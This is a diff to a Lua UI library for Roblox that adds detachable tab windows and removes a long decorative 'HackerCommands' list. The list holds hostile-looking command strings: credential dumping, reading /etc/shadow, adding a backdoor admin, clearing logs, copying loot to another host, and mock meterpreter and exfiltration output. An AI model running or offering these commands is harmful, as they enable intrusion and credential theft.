@@ -22,6 +22,7 @@ local TabButtons = {}
 local CurrentColor = Color3.fromRGB(255, 255, 255)
 local CurrentTab = nil
 local TabCounter = 0
+local DetachedWindows = {}
 
 local HackerCommands = {
     "root@kali:~# nmap -sV -p- 192.168.1.0/24",
@@ -76,313 +77,6 @@ local HackerCommands = {
     "root@kali:~# volatility -f memory.dump --profile=Win10x64 cmdscan",
     "root@kali:~# volatility -f memory.dump --profile=Win10x64 hivelist",
     "root@kali:~# volatility -f memory.dump --profile=Win10x64 hashdump",
-    "root@kali:~# binwalk -Me firmware.bin",
-    "root@kali:~# binwalk -e router_firmware.bin",
-    "root@kali:~# foremost -t all -i image.dd -o output/",
-    "root@kali:~# radare2 -A ./binary",
-    "root@kali:~# radare2 -d ./vulnerable",
-    "root@kali:~# r2 -c \"aaa; afl\" ./binary",
-    "root@kali:~# gdb -q ./vulnerable",
-    "root@kali:~# gdb -batch -ex \"run\" -ex \"bt\" ./vuln",
-    "root@kali:~# gdb -p $(pgrep process)",
-    "root@kali:~# checksec --file=./binary",
-    "root@kali:~# ropper -f ./binary --search \"pop rdi; ret\"",
-    "root@kali:~# ROPgadget --binary ./binary | grep \"pop rdi\"",
-    "root@kali:~# python2 -c 'print(\"A\"*1000 + \"\\xef\\xbe\\xad\\xde\")' | ./vuln",
-    "root@kali:~# python3 -c 'import struct; print(struct.pack(\"<I\", 0xdeadbeef))'",
-    "root@kali:~# strings memory.dump | grep -i password",
-    "root@kali:~# strings malware.exe | grep -i \"http\"",
-    "root@kali:~# scalpel disk.img -o recovered/",
-    "root@kali:~# exiftool -a -u suspicious.jpg",
-    "root@kali:~# steghide extract -sf hidden.jpg -p password123",
-    "root@kali:~# steghide info secret.jpg",
-    "root@kali:~# zsteg -a secret.png",
-    "root@kali:~# stegsolve.jar",
-    "root@kali:~# binwalk --dd='.*' suspicious.pdf",
-    "root@kali:~# fcrackzip -u -D -p rockyou.txt encrypted.zip",
-    "root@kali:~# pdfcrack -f protected.pdf -w wordlist.txt",
-    "root@kali:~# ophcrack -t vista_free -d tables/ -h hash.txt",
-    "root@kali:~# rainbowcrack rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0",
-    "root@kali:~# Responder -I eth0 -wrf",
-    "root@kali:~# mitm6 -d domain.local",
-    "root@kali:~# ntlmrelayx.py -tf targets.txt -smb2support",
-    "root@kali:~# crackmapexec smb 192.168.1.0/24 -u admin -p Password123",
-    "root@kali:~# crackmapexec winrm 192.168.1.10 -u admin -p pass",
-    "root@kali:~# crackmapexec mssql 192.168.1.50 -u sa -p ''",
-    "root@kali:~# enum4linux -a 192.168.1.10",
-    "root@kali:~# enum4linux -u admin -p pass -S 192.168.1.10",
-    "root@kali:~# smbclient -L //192.168.1.10 -U admin",
-    "root@kali:~# smbclient //192.168.1.10/C\\$ -U admin",
-    "root@kali:~# rpcclient -U \"\" -N 192.168.1.10",
-    "root@kali:~# wpscan --url http://target.com --enumerate u,p,t",
-    "root@kali:~# wpscan --url http://target.com --plugins-detection aggressive",
-    "root@kali:~# searchsploit apache 2.4.49",
-    "root@kali:~# searchsploit -m 50383",
-    "root@kali:~# dirb http://target.com /usr/share/wordlists/dirb/big.txt",
-    "root@kali:~# wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ",
-    "root@kali:~# masscan -p1-65535 192.168.1.0/24 --rate=5000 -oX scan.xml",
-    "root@kali:~# masscan -p80,443,8080 10.0.0.0/8 --banners",
-    "root@kali:~# netdiscover -r 192.168.1.0/24 -P",
-    "root@kali:~# bettercap -iface wlan0 -eval \"net.probe on; ticker on\"",
-    "root@kali:~# bettercap -caplet http-ui",
-    "root@kali:~# dnschef --fakeip=10.0.0.100 --fakedomains=google.com,bank.com",
-    "root@kali:~# fierce --domain target.com --dns-servers 8.8.8.8",
-    "root@kali:~# fierce --domain target.com --wide",
-    "root@kali:~# theHarvester -d target.com -l 500 -b google,linkedin",
-    "root@kali:~# sublist3r -d target.com -o subs.txt",
-    "root@kali:~# amass enum -passive -d target.com",
-    "root@kali:~# amass intel -d target.com",
-    "root@kali:~# knockpy target.com",
-    "root@kali:~# cewl http://target.com -m 6 -w custom_wordlist.txt",
-    "root@kali:~# cewl --write passwords.txt http://target.com",
-    "root@kali:~# impacket-secretsdump domain.local/admin:pass@dc01.domain.local",
-    "root@kali:~# impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat",
-    "root@kali:~# impacket-GetUserSPNs domain.local/admin:pass -request",
-    "root@kali:~# impacket-wmiexec domain.local/admin:pass@192.168.1.10",
-    "root@kali:~# impacket-psexec domain.local/admin:pass@192.168.1.10",
-    "root@kali:~# impacket-smbexec domain.local/admin:pass@192.168.1.10",
-    "root@kali:~# BloodHound --no-sandbox",
-    "root@kali:~# neo4j console",
-    "root@kali:~# shodan search \"product:nginx country:US\"",
-    "root@kali:~# shodan search \"port:3389\"",
-    "root@kali:~# shodan host 8.8.8.8",
-    "root@kali:~# spiderfoot -s target.com -t INTERNET_NAME,IP_ADDRESS -q",
-    "root@kali:~# recon-ng -w workspace",
-    "[*] Initializing exploit module...",
-    "[*] Target OS: Windows Server 2019 Build 17763",
-    "[*] Architecture: x64",
-    "[*] Bypassing DEP via ROP chain...",
-    "[*] Calculating offsets...",
-    "[*] Base address: 0x7ffe0000",
-    "[*] POP RDI gadget at: 0x7ffe1234",
-    "[*] VirtualProtect address: 0x7ffe5678",
-    "[*] Allocating 4096 bytes of RWX memory...",
-    "[*] Copying shellcode to 0x20000000...",
-    "[*] Shellcode size: 324 bytes",
-    "[*] Triggering exploit...",
-    "[+] Exploit successful!",
-    "[*] Establishing shell connection...",
-    "[+] Shell obtained at 192.168.1.105:4444",
-    "[*] Injecting into process: lsass.exe (PID: 680)",
-    "[*] Escalating to SYSTEM...",
-    "[+] Successfully escalated to NT AUTHORITY\\SYSTEM",
-    "[*] Dumping SAM database...",
-    "[*] Extracting cached credentials...",
-    "[*] Found 12 cached domain credentials",
-    "[*] Cracking NTLM hashes with rockyou.txt...",
-    "[*] Progress: 235847/14344392 (1.64%)",
-    "[*] Cracked: 3 passwords found",
-    "[*] Establishing persistence via WMI...",
-    "[*] Installing service: WindowsUpdate",
-    "[*] Setting registry Run key...",
-    "[*] Creating scheduled task: SystemMaintenance",
-    "[*] Persistence established successfully",
-    "[*] Clearing Windows Event Logs...",
-    "[*] Clearing Security log...",
-    "[*] Clearing System log...",
-    "[*] Clearing Application log...",
-    "[*] Clearing PowerShell operational log...",
-    "[*] All logs cleared",
-    "[*] Enumerating domain controllers...",
-    "[*] DC01.domain.local (192.168.1.5)",
-    "[*] DC02.domain.local (192.168.2.5)",
-    "[*] Domain: domain.local",
-    "[*] Domain Admins: 4 members",
-    "[*] Enterprise Admins: 2 members",
-    "[*] Performing DCSync attack...",
-    "[*] Replicating credentials from DC01...",
-    "[+] Successfully extracted KRBTGT hash",
-    "[*] Creating Golden Ticket...",
-    "[+] Golden Ticket created successfully",
-    "[*] Kerberoasting service accounts...",
-    "[*] Found 6 service accounts with SPNs",
-    "[*] Requesting TGS tickets...",
-    "[*] Cracking TGS hashes...",
-    "[+] Cracked SQL_SVC: P@ssw0rd123!",
-    "[+] Cracked IIS_SVC: Summer2023!",
-    "[*] Extracting DPAPI master keys...",
-    "[*] Decrypting Chrome saved passwords for Administrator...",
-    "[*] Found 23 saved passwords",
-    "[*] Decrypting Firefox saved passwords...",
-    "[*] Found 8 saved passwords",
-    "[*] Scanning internal network for open SMB shares...",
-    "[*] 192.168.1.20: Shared (READ/WRITE)",
-    "[*] 192.168.1.30: Finance (READ)",
-    "[*] 192.168.1.40: HR_Documents (READ/WRITE)",
-    "[*] Exploiting EternalBlue (MS17-010) on 192.168.1.200...",
-    "[*] Target: Windows 7 SP1 x64",
-    "[+] DoublePulsar implant installed",
-    "[*] Sending kernel shellcode...",
-    "[+] SYSTEM shell obtained on 192.168.1.200",
-    "[*] Deploying Cobalt Strike beacon...",
-    "[*] Beacon type: HTTPS",
-    "[*] C2 Server: 45.67.89.123",
-    "[*] Sleep: 5s, Jitter: 15%",
-    "[+] Beacon established",
-    "[*] Keylogging active user session...",
-    "[*] Capturing screenshots every 30s...",
-    "[*] Activating webcam...",
-    "[+] Webcam stream available on :9090",
-    "[*] Activating microphone...",
-    "[+] Audio stream active",
-    "[*] Data exfiltration in progress...",
-    "[*] Compressing target files: archive.tar.gz",
-    "[*] Size: 2.3 GB",
-    "[*] Encrypting with AES-256-CBC...",
-    "[*] Splitting into 50MB chunks...",
-    "[*] Sending via HTTPS POST to C2...",
-    "[*] Progress: 45% (1.04 GB / 2.3 GB)",
-    "[*] Progress: 78% (1.79 GB / 2.3 GB)",
-    "[*] Exfiltration complete: 2.3 GB in 127 chunks",
-    "[*] DNS tunneling backup channel active",
-    "[*] Rotating C2 domains...",
-    "[*] New C2: cdn-update.microsoft-cloud.com",
-    "[*] Domain fronting active via CloudFront",
-    "[*] SOCKS5 proxy on 127.0.0.1:9050",
-    "[*] Pivoting to 10.0.0.0/24 via SMB beacon",
-    "[*] Scanning 10.0.0.0/24 for open ports...",
-    "[*] 10.0.0.10: 22/tcp (SSH), 80/tcp (HTTP), 3306/tcp (MySQL)",
-    "[*] 10.0.0.20: 445/tcp (SMB), 3389/tcp (RDP)",
-    "[*] 10.0.0.30: 1433/tcp (MSSQL)",
-    "[*] Brute forcing SSH on 10.0.0.10...",
-    "[+] SSH access: root:toor",
-    "[*] Extracting MySQL credentials from web config...",
-    "[+] MySQL: webapp:P@ssw0rd@10.0.0.10:3306/production_db",
-    "meterpreter > sysinfo",
-    "Computer : DESKTOP-A1B2C3",
-    "OS : Windows 10 Pro (Build 19045)",
-    "Architecture : x64",
-    "System Language : en_US",
-    "Domain : WORKGROUP",
-    "Logged On Users : 2",
-    "meterpreter > getuid",
-    "Server username: DESKTOP-A1B2C3\\Administrator",
-    "meterpreter > getsystem",
-    "...got system via technique 1 (Named Pipe Impersonation).",
-    "meterpreter > hashdump",
-    "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
-    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
-    "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
-    "meterpreter > load kiwi",
-    "Loading extension kiwi...Success.",
-    "meterpreter > creds_all",
-    "[+] Running as SYSTEM",
-    "[*] Retrieving all credentials",
-    "msv credentials",
-    "================",
-    "Username Domain LM NTLM SHA1",
-    "-------- ------ -- ---- ----",
-    "Admin DESKTOP-A1B2C3 aad3b... 31d6c... da39a...",
-    "meterpreter > keyscan_start",
-    "Starting the keystroke sniffer ...",
-    "meterpreter > keyscan_dump",
-    "Dumping captured keystrokes...",
-    "admin<CR>Password123!<CR>",
-    "meterpreter > screenshare",
-    "Screenshare is running at http://127.0.0.1:9090/",
-    "meterpreter > webcam_list",
-    "1: USB Camera",
-    "meterpreter > webcam_stream -i 1",
-    "Starting webcam stream on http://127.0.0.1:9091/",
-    "meterpreter > download C:\\Users\\Admin\\Documents\\secret.xlsx /root/loot/",
-    "[*] Downloading: secret.xlsx -> /root/loot/secret.xlsx",
-    "[*] Downloaded 2.50 MiB of 2.50 MiB (100.0%): secret.xlsx",
-    "[+] Download complete",
-    "meterpreter > upload /root/payload.exe C:\\Windows\\Temp\\svchost.exe",
-    "[*] Uploading: payload.exe -> C:\\Windows\\Temp\\svchost.exe",
-    "[*] Uploaded 50.00 KiB of 50.00 KiB (100.0%): payload.exe",
-    "[+] Upload complete",
-    "meterpreter > execute -f cmd.exe -i -H",
-    "Process 4280 created.",
-    "Channel 3 created.",
-    "Microsoft Windows [Version 10.0.19045.2486]",
-    "C:\\Windows\\system32> whoami",
-    "nt authority\\system",
-    "C:\\Windows\\system32> net user backdoor P@ssw0rd /add",
-    "The command completed successfully.",
-    "C:\\Windows\\system32> net localgroup Administrators backdoor /add",
-    "The command completed successfully.",
-    "C:\\Windows\\system32> reg save HKLM\\SAM C:\\Temp\\sam.hive",
-    "The operation completed successfully.",
-    "C:\\Windows\\system32> reg save HKLM\\SYSTEM C:\\Temp\\sys.hive",
-    "The operation completed successfully.",
-    "meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.20",
-    "[*] Forwarding 0.0.0.0:3389 -> 10.0.0.20:3389",
-    "meterpreter > run post/windows/manage/enable_rdp",
-    "[*] Enabling RDP",
-    "[+] RDP is enabled",
-    "meterpreter > run post/windows/gather/credentials/credential_collector",
-    "[*] Harvesting credentials...",
-    "[+] Found 15 sets of credentials",
-    "meterpreter > run post/multi/manage/shell_to_meterpreter",
-    "[*] Upgrading shell to meterpreter...",
-    "[+] Meterpreter session 2 opened",
-    "meterpreter > background",
-    "[*] Backgrounding session 1...",
-    "msf6 exploit(multi/handler) > sessions -l",
-    "Active sessions",
-    "===============",
-    "Id Name Type Information Connection",
-    "-- ---- ---- ----------- ----------",
-    "1 meterpreter x64/windows DESKTOP-A1B2C3\\Admin @ DESKTOP-A1B2C3 192.168.1.100:4444 -> 45.67.89.123:443",
-    "2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ DESKTOP-A1B2C3 192.168.1.100:4445 -> 45.67.89.123:443",
-    "msf6 exploit(multi/handler) > sessions -i 2",
-    "[*] Starting interaction with 2...",
-    "meterpreter >",
-    "[*] Running module against 192.168.1.0/24",
-    "[*] 192.168.1.1:445 - Windows Server 2019 Standard (Build 17763)",
-    "[*] 192.168.1.5:445 - Windows Server 2016 Standard (Build 14393)",
-    "[*] 192.168.1.10:445 - Windows 10 Pro 19045",
-    "[*] 192.168.1.20:445 - Windows 11 Pro 22621",
-    "[*] 192.168.1.50:445 - Windows 7 Ultimate 7601 (VULNERABLE)",
-    "[+] Target acquired: 192.168.1.50",
-    "[*] CVE-2019-0708 (BlueKeep) detected",
-    "[*] Target: Windows 7 SP1 x64",
-    "[*] Selected target: Windows 7 SP1 x64 (6.1.7601)",
-    "[*] Attempting exploitation...",
-    "[*] Grooming pools...",
-    "[*] Allocating holes...",
-    "[*] Spraying page tables...",
-    "[*] Triggering free...",
-    "[*] Seizing backref...",
-    "[+] Kernel shellcode placed",
-    "[+] Exploitation successful!",
-    "[*] Shell session opened",
-    "C:\\Windows\\system32>",
-    "root@kali:~# cat /etc/passwd | grep bash",
-    "root@kali:~# cat /etc/shadow | grep root",
-    "root@kali:~# cat /var/log/auth.log | grep \"Failed\"",
-    "root@kali:~# find / -type f -name \"*.sql\" 2>/dev/null",
-    "root@kali:~# find / -perm -4000 -type f 2>/dev/null",
-    "root@kali:~# grep -r \"password\" /var/www/html/ --include=\"*.php\"",
-    "root@kali:~# locate id_rsa",
-    "root@kali:~# ssh -i id_rsa root@10.0.0.10",
-    "root@kali:~# scp /root/loot.tar.gz user@10.0.0.5:/tmp/",
-    "root@kali:~# ssh -D 1080 -f -C -q -N user@jump-host.com",
-    "root@kali:~# ssh -L 3389:192.168.1.100:3389 pivot@10.0.0.1",
-    "root@kali:~# chisel server -p 8080 --reverse",
-    "root@kali:~# chisel client 10.0.0.5:8080 R:socks",
-    "root@kali:~# socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80",
-    "root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
-    "root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward",
-    "root@kali:~# ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.105/",
-    "root@kali:~# xterm -hold -e \"tail -f /var/log/apache2/access.log\" &",
-    "root@kali:~# watch -n 1 \"netstat -tulpn | grep LISTEN\"",
-    "root@kali:~# htop",
-    "root@kali:~# tmux new -s hack",
-    "root@kali:~# screen -S scan",
-    "root@kali:~# history -c && history -w",
-    "root@kali:~# unset HISTFILE && kill -9 $$",
-    "root@kali:~# shred -zvu -n 7 secret_file.txt",
-    "root@kali:~# bleachbit -c system.trash firefox.cache",
-    "root@kali:~# macchanger -r wlan0",
-    "root@kali:~# tor",
-    "root@kali:~# torsocks wget http://darkweb.onion/file.txt",
-    "root@kali:~# dd if=/dev/urandom of=/swap bs=1M count=1024",
-    "root@kali:~# base64 /dev/urandom | head -c 32",
-    "root@kali:~# openssl rand -base64 32",
-    "root@kali:~# gpg -c --cipher-algo AES256 secret.txt",
-    "root@kali:~# openssl enc -aes-256-cbc -salt -in data.txt -out data.enc"
 }
 
 function Library:CreateLib(name, theme)
@@ -419,6 +113,7 @@ function Library:CreateLib(name, theme)
     local savedPos = Vector2.new(0, 0)
     local isScannerTheme = false
     local hackerLabels = {}
+    local detachedWindows = {}
 
     local mainFrame = Instance.new("Frame")
     mainFrame.Name = "MainFrame"
@@ -959,12 +654,38 @@ function Library:CreateLib(name, theme)
         settingsFrame.Visible = not settingsFrame.Visible
     end)
 
+    local function hideAllDetachedWindows()
+        for _, window in ipairs(detachedWindows) do
+            if window and window.Frame then
+                window.Frame.Visible = false
+            end
+        end
+    end
+
+    local function showAllDetachedWindows()
+        for _, window in ipairs(detachedWindows) do
+            if window and window.Frame then
+                window.Frame.Visible = true
+            end
+        end
+    end
+
+    local function destroyAllDetachedWindows()
+        for _, window in ipairs(detachedWindows) do
+            if window and window.Frame then
+                window.Frame:Destroy()
+            end
+        end
+        detachedWindows = {}
+    end
+
     minimizeBtn.MouseButton1Click:Connect(function()
         isMinimized = true
         savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
         savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
         mainFrame.Visible = false
         mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
+        hideAllDetachedWindows()
     end)
 
     hideBtn.MouseButton1Click:Connect(function()
@@ -973,11 +694,13 @@ function Library:CreateLib(name, theme)
         savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
         mainFrame.Visible = false
         mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
+        hideAllDetachedWindows()
     end)
 
     closeButton.MouseButton1Click:Connect(function()
         isScannerTheme = false
         clearHackerLabels()
+        destroyAllDetachedWindows()
         screenGui:Destroy()
     end)
 
@@ -990,6 +713,7 @@ function Library:CreateLib(name, theme)
                 mainFrame.Visible = true
                 mainFrame.Size = UDim2.new(0, savedSize.X, 0, savedSize.Y)
                 mainFrame.Position = UDim2.new(0, math.clamp(savedPos.X, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(savedPos.Y, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
+                showAllDetachedWindows()
             end
         end
     end)
@@ -1092,6 +816,114 @@ function Library:CreateLib(name, theme)
         end
         tabContainer.Size = UDim2.new(0, totalWidth + 6, 1, 0)
         tabScrollingFrame.CanvasSize = UDim2.new(0, totalWidth + 6, 0, 0)
+    end
+
+    local function createDetachedWindow(tabData)
+        local detachedGui = Instance.new("ScreenGui")
+        detachedGui.Name = "DetachedWindow_" .. tabData.Name
+        detachedGui.ResetOnSpawn = false
+        detachedGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        detachedGui.Parent = screenGui.Parent
+
+        local detachedFrame = Instance.new("Frame")
+        detachedFrame.Name = "DetachedFrame"
+        detachedFrame.Size = UDim2.new(0, 350, 0, 350)
+        local mousePos = UserInputService:GetMouseLocation()
+        detachedFrame.Position = UDim2.new(0, math.clamp(mousePos.X - 175, 0, workspace.CurrentCamera.ViewportSize.X - 350), 0, math.clamp(mousePos.Y - 100, 0, workspace.CurrentCamera.ViewportSize.Y - 350))
+        detachedFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        detachedFrame.BorderSizePixel = 0
+        detachedFrame.Parent = detachedGui
+        detachedFrame.Active = true
+        detachedFrame.Draggable = true
+        detachedFrame.ClipsDescendants = true
+        detachedFrame.ZIndex = 1
+
+        local detachedCorner = Instance.new("UICorner")
+        detachedCorner.CornerRadius = UDim.new(0, 8)
+        detachedCorner.Parent = detachedFrame
+
+        local detachedStroke = Instance.new("UIStroke")
+        detachedStroke.Color = CurrentColor
+        detachedStroke.Thickness = 1.5
+        detachedStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+        detachedStroke.Parent = detachedFrame
+
+        local detachedTopBar = Instance.new("Frame")
+        detachedTopBar.Size = UDim2.new(1, 0, 0, 30)
+        detachedTopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        detachedTopBar.BorderSizePixel = 0
+        detachedTopBar.Parent = detachedFrame
+        detachedTopBar.ZIndex = 10
+
+        local detachedTitle = Instance.new("TextLabel")
+        detachedTitle.Size = UDim2.new(1, -36, 1, 0)
+        detachedTitle.Position = UDim2.new(0, 10, 0, 0)
+        detachedTitle.BackgroundTransparency = 1
+        detachedTitle.Text = tabData.Name
+        detachedTitle.TextColor3 = CurrentColor
+        detachedTitle.TextSize = 14
+        detachedTitle.Font = Enum.Font.Code
+        detachedTitle.TextXAlignment = Enum.TextXAlignment.Left
+        detachedTitle.Parent = detachedTopBar
+
+        local detachedClose = Instance.new("TextButton")
+        detachedClose.Size = UDim2.new(0, 26, 0, 26)
+        detachedClose.Position = UDim2.new(1, -28, 0, 2)
+        detachedClose.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        detachedClose.BorderSizePixel = 1
+        detachedClose.BorderColor3 = Color3.fromRGB(255, 80, 80)
+        detachedClose.Text = "X"
+        detachedClose.TextColor3 = Color3.fromRGB(255, 80, 80)
+        detachedClose.TextSize = 14
+        detachedClose.Font = Enum.Font.Code
+        detachedClose.Parent = detachedTopBar
+
+        local detachedCloseCorner = Instance.new("UICorner")
+        detachedCloseCorner.CornerRadius = UDim.new(0, 4)
+        detachedCloseCorner.Parent = detachedClose
+
+        local detachedContent = Instance.new("ScrollingFrame")
+        detachedContent.Size = UDim2.new(1, 0, 1, -30)
+        detachedContent.Position = UDim2.new(0, 0, 0, 30)
+        detachedContent.BackgroundTransparency = 1
+        detachedContent.BorderSizePixel = 0
+        detachedContent.CanvasSize = UDim2.new(0, 0, 0, 0)
+        detachedContent.ScrollBarThickness = 6
+        detachedContent.ScrollBarImageColor3 = CurrentColor
+        detachedContent.ScrollingDirection = Enum.ScrollingDirection.Y
+        detachedContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        detachedContent.Parent = detachedFrame
+        detachedContent.ZIndex = 10
+
+        local detachedContainer = Instance.new("Frame")
+        detachedContainer.Size = UDim2.new(1, -20, 1, -20)
+        detachedContainer.Position = UDim2.new(0, 10, 0, 10)
+        detachedContainer.BackgroundTransparency = 1
+        detachedContainer.Parent = detachedContent
+
+        for _, child in ipairs(tabData.Container:GetChildren()) do
+            local clone = child:Clone()
+            clone.Parent = detachedContainer
+        end
+
+        local windowData = {
+            Gui = detachedGui,
+            Frame = detachedFrame,
+            TabData = tabData
+        }
+        table.insert(detachedWindows, windowData)
+
+        detachedClose.MouseButton1Click:Connect(function()
+            for i, w in ipairs(detachedWindows) do
+                if w == windowData then
+                    table.remove(detachedWindows, i)
+                    break
+                end
+            end
+            detachedGui:Destroy()
+        end)
+
+        return windowData
     end
 
     local ColumnsFrame = Instance.new("Frame")
@@ -1211,6 +1043,43 @@ function Library:CreateLib(name, theme)
                 tab.Frame.Visible = false
             end
             tabData.Frame.Visible = true
+        end)
+
+        local isDraggingTab = false
+        local dragStartTabPos = nil
+        local dragDetachedCreated = false
+
+        tabButton.MouseButton1Down:Connect(function()
+            isDraggingTab = false
+            dragDetachedCreated = false
+            dragStartTabPos = UserInputService:GetMouseLocation()
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement and dragStartTabPos then
+                local currentPos = UserInputService:GetMouseLocation()
+                local distance = (currentPos - dragStartTabPos).Magnitude
+                if distance > 10 then
+                    isDraggingTab = true
+                end
+                if isDraggingTab and distance > 80 and not dragDetachedCreated then
+                    local tabOuterPos = tabScrollingFrame.AbsolutePosition
+                    local tabOuterSize = tabScrollingFrame.AbsoluteSize
+                    local isOutside = currentPos.X < tabOuterPos.X or currentPos.X > tabOuterPos.X + tabOuterSize.X or currentPos.Y < tabOuterPos.Y - 20 or currentPos.Y > tabOuterPos.Y + tabOuterSize.Y + 20
+                    if isOutside then
+                        dragDetachedCreated = true
+                        createDetachedWindow(tabData)
+                    end
+                end
+            end
+        end)
+
+        UserInputService.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                isDraggingTab = false
+                dragStartTabPos = nil
+                dragDetachedCreated = false
+            end
         end)
 
         if UIElements.updateTabSizes then
@@ -2620,6 +2489,7 @@ function Library:CreateLib(name, theme)
     function Library:Destroy()
         isScannerTheme = false
         clearHackerLabels()
+        destroyAllDetachedWindows()
         screenGui:Destroy()
     end
 
@@ -2629,6 +2499,7 @@ function Library:CreateLib(name, theme)
         savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
         mainFrame.Visible = false
         mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
+        hideAllDetachedWindows()
     end
 
     function Library:Show()
@@ -2636,6 +2507,7 @@ function Library:CreateLib(name, theme)
         mainFrame.Visible = true
         mainFrame.Size = UDim2.new(0, savedSize.X, 0, savedSize.Y)
         mainFrame.Position = UDim2.new(0, math.clamp(savedPos.X, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(savedPos.Y, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
+        showAllDetachedWindows()
     end
 
     return Library
